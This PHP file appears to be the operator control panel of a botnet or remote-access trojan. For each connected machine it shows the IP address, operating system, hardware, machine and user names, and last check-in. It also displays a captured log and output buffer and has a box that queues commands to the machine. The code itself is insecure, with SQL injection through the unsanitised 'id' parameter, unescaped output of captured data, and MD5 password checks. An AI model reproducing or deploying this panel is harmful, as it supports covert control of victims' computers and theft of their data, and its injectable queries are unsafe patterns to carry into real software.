<?php 
 require_once('assets/config.php');
 session_start();
 ini_set('session.bug_compat_warn', 0);
 ini_set('session.bug_compat_42', 0);

 $query = $mysqli->query("SELECT COUNT(1) FROM admin");
 $cadmin = $query->fetch_array();
 
 $hAuth = false;
 if (isset($_POST['submit-button'])) {
  for($i = 1; $i <= $cadmin[0]; $i++) {
   $query = $mysqli->query("SELECT * FROM admin WHERE id='$i'");
   $admin = $query->fetch_assoc();
   if(($_POST['login-field'] == $admin['login']) and (md5($_POST['password-field']) == $admin['password'])) {
    $hAuth = true;
    $_SESSION['login'] = $admin['login'];
    $_SESSION['password'] = $admin['password'];
   }
  }
 } else {
  for($i = 1; $i <= $cadmin[0]; $i++) {
   $query = $mysqli->query("SELECT * FROM admin WHERE id='$i'");
   $admin = $query->fetch_assoc();
   if(($_SESSION['login'] == $admin['login']) and ($_SESSION['password'] == $admin['password'])) { 
    $hAuth = true; 
    break;
   }
  }
 }
 if($hAuth == false) { header("Location: login.php"); exit; } 
 
 $id = "none";
 if(isset($_GET['id'])) {
  $id = $_GET['id'];
 }
 
 if(isset($_POST['cmd-text'])) {
  $text = $_POST['cmd-text'];
  if($text == "delete") {
    $mysqli->query("DELETE FROM users WHERE uid='$id'");
    header("Location: admin.php");
    exit;
  } elseif($text == "iclear") {
    $mysqli->query("UPDATE users SET buffer='' WHERE uid='$id'");
  } elseif($text == "lclear") {
    $mysqli->query("UPDATE users SET log='' WHERE uid='$id'");
  }

  $mysqli->query("UPDATE users SET team='$text' WHERE uid='$id'");
  header("Location: control.php?id=".$id);
 }

 $query = $mysqli->query("SELECT * FROM users WHERE uid='$id'");
 $data = $query->fetch_assoc();
?>

<html>
 <head>
  <title>- Control -</title>
  <link rel="shortcut icon" href="assets/img/favicon.ico" type="image/x-icon">
  <link rel="stylesheet" href="assets/css/style.css" media="screen" type="text/css" />
  <link rel="stylesheet" href="assets/css/tables.css" media="screen" type="text/css" />
 </head>
 <body>
  <nav class="admin-header">
   <input class="admin-header-back" type="button" value="<" onClick='location.href="admin.php"'>
  </nav>
  
  <div class="info-box">
   <div class="box-in" id="update-info">
     <?php 
      if(substr($data['lresp'], 0, 10) == date("d-m-Y") and
       strtotime(substr($data['lresp'], 12, 8)) + 10 >= strtotime(date("h:i:s"))) {
        echo "<b class=\"red\">Status: </b>Active</br>";
      } else {
        echo "<b class=\"red\">Status: </b>Inactive</br>";
      }
    ?>
    <b class="red">Tag: </b><?php echo $data['tag'] ?><br>
    </br>
    
    <b class="red">User-ID: </b><?php echo $data['uid'] ?><br>
    <b class="red">IP-Address: </b><?php echo $data['ip'] ?><br><br>
    <b class="red">Operating System: </b><?php echo $data['os'] ?><br>
    <b class="red">Digit: </b><?php echo $data['digit'] ?><br>
    <b class="red">Processor: </b><?php echo $data['cpu'] ?><br>
    <b class="red">Video Controller: </b><?php echo $data['gpu'] ?><br>
    <b class="red">Total RAM: </b><?php echo $data['tram'] ?><br><br>
    <b class="red">Machine Name: </b><?php echo $data['cname'] ?><br>
    <b class="red">User Name: </b><?php echo $data['uname'] ?><br><br> 
    <b class="red">First Response: </b><?php echo $data['fresp'] ?><br>
    <b class="red">Last Response: </b><?php echo $data['lresp'] ?><br>
   </div>
  </div>

  <div class="log-box">
   <div class="box-in" id="update-log">
    <?php echo $data['log']; ?>
   </div>
  </div>

  <div class="control-box">
   <div class="box-in" id="update-control" style="height: 90%;">
    <?php echo $data['buffer']; ?>
   </div>
    <?php echo "<form action=\"control.php?id=$id\" method=\"post\">"; ?>
     <input type="text" name="cmd-text" class="box-input" autocomplete="off">
    </form>  
  </div>

 </body>
</html>